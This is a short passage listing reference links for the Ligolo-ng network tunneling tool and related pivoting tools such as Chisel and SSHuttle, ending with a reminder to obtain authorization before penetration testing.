- **GitHub:** https://github.com/nicocha30/ligolo-ng
- **Official docs:** https://docs.ligolo.ng/
- **Related tools:** Chisel (https://github.com/jpillora/chisel), SSHuttle (https://github.com/sshuttle/sshuttle), Metasploit Autoroute, socat

> Always obtain proper authorization before performing penetration testing activities.
